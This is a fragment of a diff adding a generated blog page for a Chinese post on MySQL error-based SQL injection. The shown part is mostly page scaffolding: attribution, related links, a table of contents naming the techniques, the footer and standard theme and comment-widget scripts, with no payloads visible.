`a`))&#x27; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p>————————————————<br>本文主要参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/">先知社区</a> 的文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253">MYSQL报错注入的一点总结</a>，仅作些许修改。</p>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章推荐</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\宽字节注入深度讲解\" rel="bookmark">宽字节注入深度讲解</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\基于约数的SQL攻击\" rel="bookmark">基于约束的SQL攻击</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\信息安全产品\" rel="bookmark">信息安全产品</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\如何搭建《从0到1：CTFer 成长之路》docker 做题环境\" rel="bookmark">如何搭建《从0到1：CTFer 成长之路》docker 做题环境</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\flask之ssti模版注入从零到入门\" rel="bookmark">flask之ssti模版注入从零到入门</a></div>
+    </li>
+  </ul>
+
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="Charles 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Charles 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Charles
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://cs-cshi.github.io/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="报错注入">https://cs-cshi.github.io/报错注入/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+              <a href="/tags/Web-%E5%AE%89%E5%85%A8/" rel="tag"># Web 安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%95%B0%E7%9A%84SQL%E6%94%BB%E5%87%BB/" rel="prev" title="基于约束的SQL攻击">
+      <i class="fa fa-chevron-left"></i> 基于约束的SQL攻击
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录 | toc
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览 | overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA"><span class="nav-text">1. 数据溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF"><span class="nav-text">2. xpath语法错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="nav-text">3. 主键重复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7"><span class="nav-text">4. 一些特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%88%97%E5%90%8D%E9%87%8D%E5%A4%8D"><span class="nav-text">4.1 列名重复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="nav-text">4.2 几何函数</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Charles"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Charles</p>
+  <div class="site-description" itemprop="description">慢下来，记录生活点滴，畅游人类知识和艺术的海洋。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cs-cshi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cs-cshi" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/572081809@qq.com" title="E-Mail → 572081809@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="报错注入&#x2F;">报错注入</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%95%B0%E7%9A%84SQL%E6%94%BB%E5%87%BB/" title="基于约数的SQL攻击&#x2F;">基于约束的SQL攻击</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/" title="宽字节注入深度讲解&#x2F;">宽字节注入深度讲解</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/" title="信息安全产品&#x2F;">信息安全产品</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/pandas/" title="pandas&#x2F;">pandas</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Charles</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">160k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:25</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
+  <script>
+      window.addEventListener('load', () => {
+      quicklink({
+        timeout : 3000,
+        priority: true,
+        ignores : [uri => uri.includes('#'),uri => uri === 'https://cs-cshi.github.io/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/',]
+      });
+      });
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'hbdf2zNhxCCzlSuodiOKirnE-gzGzoHsz',
+      appKey     : 'gJuRc9Mu4JIB0czCtRefSodC',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
